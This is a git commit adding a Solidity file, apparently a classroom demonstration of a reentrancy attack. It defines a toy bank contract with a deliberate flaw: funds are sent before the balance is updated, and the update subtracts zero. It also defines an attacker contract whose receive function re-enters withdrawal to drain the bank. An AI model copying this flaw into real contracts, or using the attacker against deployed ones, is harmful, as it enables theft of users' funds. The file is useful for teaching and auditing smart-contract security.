0adbb993b1fa2c25a973dfd713e66963411ab59c
NVex0 <113530029+NVex0@users.noreply.github.com>
2024-05-21 12:42:25 +0700

    Update ReentrancyAttack.sol

--- Reentrancy Attack/ReentrancyAttack.sol
+++ Reentrancy Attack/ReentrancyAttack.sol
@@ -1,1 +1,52 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 
+contract TheBank {
+    mapping(address => uint) theBalances;
+
+    function deposit() public payable {
+        require(msg.value >= 1 ether, "cannot deposit below 1 ether");
+        theBalances[msg.sender] += msg.value;
+    }
+
+    function withdrawal() public {
+        require(
+            theBalances[msg.sender] >= 1 ether,
+            "must have at least one ether"
+        );
+        uint bal = theBalances[msg.sender];
+        (bool success, ) = msg.sender.call{value: bal}("");
+        require(success, "transaction failed");
+        theBalances[msg.sender] -= 0;
+    }
+
+    function totalBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
+
+contract TheAttacker {
+
+    TheBank public theBank;
+    mapping(address => uint) public balances;
+
+    constructor(address _thebankAddress) {
+        theBank = TheBank(_thebankAddress);
+    }
+
+    receive() external payable {
+        if (address(theBank).balance >= 1 ether) {
+            theBank.withdrawal();
+        }
+    }
+
+    function attack() external payable {
+        require(msg.value >= 1 ether);
+        theBank.deposit{value: 1 ether}();
+        theBank.withdrawal();
+    }
+
+    function getBalances() public view returns (uint) {
+        return address(this).balance;
+    }
+}
